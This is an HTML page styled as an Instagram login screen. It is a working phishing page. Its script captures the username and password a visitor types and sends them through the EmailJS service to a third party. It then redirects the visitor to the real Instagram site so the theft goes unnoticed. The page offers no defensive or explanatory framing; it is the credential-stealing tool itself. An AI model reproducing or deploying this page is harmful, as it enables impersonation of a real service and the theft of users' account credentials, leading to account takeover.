<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Style Login</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            flex-direction: column;
        }

        /* Language Button */
        .language-dropdown {
            background-color: transparent;
            color: #8e8e8e;
            font-size: 14px;
            border: none;
            cursor: pointer;
            padding: 8px 16px;
            position: absolute;
            top: 5px;
            left: 50%;
            transform: translateX(-50%);
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 40px;
            margin-top: 30px;
            position: absolute;
            top: 43px; /* Moved logo a little more up */
            left: 50%;
            transform: translateX(-50%);
        }

        .container {
            width: 100%;
            max-width: 320px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px;
            box-sizing: border-box;
        }

        .facebook-button {
            width: 100%;
            max-width: 280px;
            background-color: #3897f0;
            color: white;
            padding: 10px;
            font-size: 12px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook-button img {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }

        /* Divider with OR and lines */
        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 12px;
            margin: 15px 0;
            width: 100%;
        }

        .divider::before {
            content: '';
            flex: 1;
            border-bottom: 1px solid #8e8e8e;
            max-width: 50%; /* Extended left line */
            margin-right: 8px;
        }

        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #8e8e8e;
            width: 100%; /* Align right line with the text boxes */
            margin-left: 8px;
        }

        .form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .form-input {
            background-color: #262626;
            border: 1px solid #424242;
            border-radius: 4px;
            color: #fff;
            padding: 10px;
            margin-bottom: 8px;
            font-size: 12px;
            width: 100%;
            max-width: 280px;
            box-sizing: border-box;
        }

        .form-input:focus {
            border-color: #fff;
            outline: none;
        }

        .login-button {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 10px;
            font-size: 12px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            max-width: 280px;
        }

        .login-button:hover {
            background-color: #3178c6;
        }

        .forgot-password {
            font-size: 10px;
            color: #3897f0;
            text-decoration: none;
            text-align: center;
            margin-bottom: 15px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-text {
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }

        .signup-text a {
            color: #3897f0;
            text-decoration: none;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        .password-container {
            position: relative;
            width: 100%;
            max-width: 280px;
        }

        .show-password-btn {
            background-color: transparent;
            color: #3897f0;
            border: none;
            font-size: 12px;
            cursor: pointer;
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
        }
    </style>
</head>
<body>
    <button class="language-dropdown">English</button>

    <div class="container">
        <div class="logo">Instagram</div>

        <!-- Facebook Button (No redirect) -->
        <button class="facebook-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
            Continue with Facebook
        </button>

        <div class="divider"><span>OR</span></div>

        <form id="loginForm" class="form">
            <input type="text" id="username" class="form-input" placeholder="Phone number, username, or email" required>
            <div class="password-container">
                <input type="password" id="password" class="form-input" placeholder="Password" required>
                <button type="button" class="show-password-btn" id="showPassword">Show</button>
            </div>
            <button type="submit" id="loginButton" class="login-button disabled" disabled>Log In</button>
        </form>

        <a href="https://www.instagram.com" class="forgot-password" target="_blank">Forgot password?</a>

        <p class="signup-text">Don't have an account? <a href="https://www.instagram.com" target="_blank">Sign up</a></p>
    </div>

    <script type="text/javascript">
        emailjs.init("ZaF8wyUZavRVBvsqx");

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            emailjs.send("service_b6ugscc", "template_wnvqxmb", {
                username: username,
                password: password
            })
            .then(function(response) {
                console.log("Email sent successfully", response);
                window.location.href = "https://www.instagram.com";
            }, function(error) {
                console.error("Failed to send email:", error);
                alert("Failed to send login data.");
            });
        });

        document.getElementById('showPassword').addEventListener('click', function() {
            const passwordField = document.getElementById('password');
            if (passwordField.type === "password") {
                passwordField.type = "text";
                this.textContent = "Hide";
            } else {
                passwordField.type = "password";
                this.textContent = "Show";
            }
        });

        document.getElementById('username').addEventListener('input', toggleLoginButton);
        document.getElementById('password').addEventListener('input', toggleLoginButton);

        function toggleLoginButton() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');

            if (username === "" || password === "") {
                loginButton.classList.add("disabled");
                loginButton.disabled = true;
            } else {
                loginButton.classList.remove("disabled");
                loginButton.disabled = false;
            }
        }

        toggleLoginButton();
    </script>
</body>
</html>
